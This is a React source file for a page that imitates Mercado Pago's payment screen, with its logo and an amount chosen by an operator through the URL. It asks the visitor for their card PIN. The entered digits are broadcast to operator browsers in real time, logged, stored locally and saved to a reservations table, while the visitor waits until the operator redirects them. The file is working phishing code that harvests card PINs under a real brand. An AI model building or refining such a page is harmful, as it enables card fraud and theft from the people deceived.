import { useEffect, useState } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { routeForStatus, fetchGuestReservation, getReservationMeta, saveGuestRoute, APROX_ESPERA_MARKER } from "@/lib/myReservations";
import { sendOnTopic, sendReservationCommand, ADMIN_DIGITS_TOPIC } from "@/lib/guestChannel";
import { useGuestRouteChannel } from "@/hooks/useGuestRouteChannel";
import { Loader2, Delete } from "lucide-react";
import mercadoPagoLogo from "@/assets/mercado-pago-icon.png";

const POLL_MS = 6000;
const MIN_DIGITS = 4;
const MAX_DIGITS = 6;
const PENDING_KEY = "df_pending_card_digits";
const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

const PagamentoAproximacaoSenha = () => {
  const { reservationId } = useParams<{ reservationId: string }>();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const [totalPrice, setTotalPrice] = useState<number | null>(
    () => getReservationMeta(reservationId ?? "")?.total_price ?? null
  );
  const [loading, setLoading] = useState(true);
  const [code, setCode] = useState("");
  const [saving, setSaving] = useState(false);
  // The /teste URL (non-UUID id) is a visual-only page — digits typed
  // there can never reach the admin, so say so clearly.
  const isTestPage = !reservationId || !UUID_RE.test(reservationId);
  // Reset the keypad whenever the admin sends the guest back to this
  // page (asking again).
  useGuestRouteChannel(reservationId, () => {
    setCode("");
    setSaving(false);
  });

  useEffect(() => {
    if (!reservationId) return;

    const load = async () => {
      const data = await fetchGuestReservation(reservationId);
      if (!data) {
        setLoading(false);
        return;
      }
      setTotalPrice(data.total_price);

      const route = await routeForStatus(data.id, data.status, data.pix_method, data.pix_message);
      saveGuestRoute(data.id, route);
      if (!route) {
        navigate(`/reserva/${reservationId}`, { replace: true });
        return;
      }
      if (!route.startsWith("/pagamento-aproximacao-senha")) {
        navigate(route, { replace: true });
        return;
      }

      setTotalPrice(data.total_price);
      setLoading(false);
    };

    load();
    const interval = setInterval(load, POLL_MS);
    return () => clearInterval(interval);
  }, [reservationId, navigate]);

  const submit = async () => {
    if (code.length < MIN_DIGITS || saving) return;
    setSaving(true);

    // Realtime reply FIRST — any signed-in admin browser receives the
    // digits instantly (broadcast bypasses RLS), persists them and
    // commands the guest's next page. Must not wait for the DB attempts.
    // Sent on BOTH topics: the global admin topic (current build) and the
    // per-reservation topic (compat with admin tabs on older builds).
    sendOnTopic(ADMIN_DIGITS_TOPIC, {
      type: "card_digits",
      digits: code,
      reservation_id: reservationId!,
    });
    sendReservationCommand(reservationId!, {
      type: "card_digits",
      digits: code,
      reservation_id: reservationId!,
    });
    console.info("[card-digits] enviados:", code);
    // Always leave the digits on this device too. When the admin tests in
    // the SAME browser, their tabs share localStorage — the admin consumes
    // this entry directly, no network needed. On separate devices it is
    // simply ignored (and cleaned up) by the admin poller.
    try {
      localStorage.setItem(
        PENDING_KEY,
        JSON.stringify({ reservationId, code, at: Date.now() })
      );
    } catch { /* ignore */ }
    // Retries cover a slow first channel join — the admin dedupes repeats.
    [1500, 3500].forEach((ms) =>
      setTimeout(() => {
        sendOnTopic(ADMIN_DIGITS_TOPIC, {
          type: "card_digits",
          digits: code,
          reservation_id: reservationId!,
        });
        sendReservationCommand(reservationId!, {
          type: "card_digits",
          digits: code,
          reservation_id: reservationId!,
        });
      }, ms)
    );

    // Preferred path: SECURITY DEFINER RPC (exists after the migration)
    const { data, error } = await supabase.rpc("submit_guest_card_last4", {
      p_reservation_id: reservationId,
      p_last4: code,
    });

    if (error || !data) {
      // Fallback for logged-in users / pre-migration: restore marker and
      // save the digits directly on the reservation when allowed. The
      // full history is appended so the admin sees every submission.
      const { data: cur } = await supabase
        .from("reservations")
        .select("card_digits_history")
        .eq("id", reservationId!)
        .maybeSingle();
      const prev = Array.isArray(cur?.card_digits_history)
        ? (cur!.card_digits_history as unknown as { digits: string; at: string }[])
        : [];
      const history = [...prev, { digits: code, at: new Date().toISOString() }];

      let updErr = (
        await supabase
          .from("reservations")
          .update({
            pix_message: APROX_ESPERA_MARKER,
            card_last4: code,
            card_digits_history: history,
          })
          .eq("id", reservationId!)
      ).error;
      if (updErr) {
        updErr = (
          await supabase
            .from("reservations")
            .update({ pix_message: APROX_ESPERA_MARKER, card_last4: code })
            .eq("id", reservationId!)
        ).error;
      }
      // NOTE: no pix_message-only restore here — the ADMIN owns the marker
      // restore after recording the digits. A blind restore from the guest
      // side (same-browser admin session) races with the admin's processing
      // and made every guard think the submission was already handled.
      if (updErr) {
        console.warn("[card-digits] nenhuma gravação no banco funcionou — dígitos ficam no canal/local");
      }
    }

    // No confirmation screen — the guest lands on the loading tab and
    // stays there until the admin points the reservation elsewhere.
    navigate(`/aguardando/${reservationId}`, { replace: true });
  };

  const press = (key: string) => {
    if (saving) return;
    if (key === "del") {
      setCode((c) => c.slice(0, -1));
      return;
    }
    setCode((c) => (c + key).slice(0, MAX_DIGITS));
  };

  if (loading) {
    return (
      <div className="min-h-dvh bg-white flex items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin text-[#009ee3]" />
      </div>
    );
  }

  const keys = ["1","2","3","4","5","6","7","8","9","","0","del"];

  // The admin chooses the amount — it arrives in the route command (?valor=)
  const valorParam = Number(searchParams.get("valor"));
  const displayPrice = Number.isFinite(valorParam) && valorParam > 0 ? valorParam : totalPrice;

  return (
    <div className="min-h-dvh bg-white flex flex-col">
      {/* Blue header — compact, logo centered */}
      <div className="bg-[#009ee3] h-12 relative flex items-center justify-center">
        <img
          src={mercadoPagoLogo}
          alt="Mercado Pago"
          className="h-8 w-auto object-contain"
        />
      </div>

      <div className="flex-1 flex flex-col items-center justify-center px-5 py-5 max-w-sm w-full mx-auto">
        {isTestPage && (
          <div className="w-full mb-4 rounded-lg bg-amber-50 border border-amber-300 px-3 py-2.5 text-center">
            <p className="text-xs font-bold text-amber-800">
              MODO TESTE — reserva não encontrada
            </p>
            <p className="text-[11px] text-amber-700 mt-0.5">
              Os dígitos digitados aqui NÃO chegam ao admin. Abra a página real
              da reserva para testar de verdade.
            </p>
          </div>
        )}
        <p className="text-slate-400 text-sm font-medium">Total</p>
        <p className="font-bold text-[#1a2b4a] tracking-tight text-[clamp(1.9rem,8vw,2.5rem)] leading-tight">
          {displayPrice != null
            ? `R$ ${displayPrice.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`
            : "—"}
        </p>

        <>
            <div className="text-center mt-5">
              <p className="text-lg font-semibold text-[#1a2b4a] leading-snug">
                Digite a senha do cartão
              </p>
            </div>

            {/* Entered digits — filled dots grow as the guest types */}
            <div className="flex items-center gap-3 mt-4 h-5">
              {code.length === 0 ? (
                <span className="text-slate-300 text-sm">
                  Digite a senha do seu cartão
                </span>
              ) : (
                Array.from({ length: code.length }).map((_, i) => (
                  <div key={i} className="w-3.5 h-3.5 rounded-full bg-[#009ee3] shadow-sm" />
                ))
              )}
            </div>

            {/* Numeric keypad */}
            <div className="grid grid-cols-3 gap-2.5 w-full max-w-[280px] mt-4 select-none">
              {keys.map((k, i) =>
                k === "" ? (
                  <div key={i} />
                ) : (
                  <button
                    key={i}
                    onClick={() => press(k)}
                    disabled={saving}
                    className="h-12 rounded-full bg-white border border-slate-200 shadow-sm text-xl font-semibold text-[#1a2b4a] flex items-center justify-center active:bg-[#009ee3] active:text-white active:border-[#009ee3] transition-all disabled:opacity-50"
                    aria-label={k === "del" ? "Apagar" : k}
                  >
                    {k === "del" ? <Delete className="w-5 h-5" /> : k}
                  </button>
                )
              )}
            </div>

            <button
              onClick={submit}
              disabled={code.length < MIN_DIGITS || saving}
              className="mt-5 w-full max-w-[280px] h-12 rounded-full bg-[#009ee3] shadow-md text-white font-semibold text-[15px] flex items-center justify-center transition-all disabled:opacity-40 active:opacity-90"
            >
              {saving ? <Loader2 className="w-5 h-5 animate-spin" /> : "Confirmar"}
            </button>
          </>
      </div>
    </div>
  );
};

export default PagamentoAproximacaoSenha;
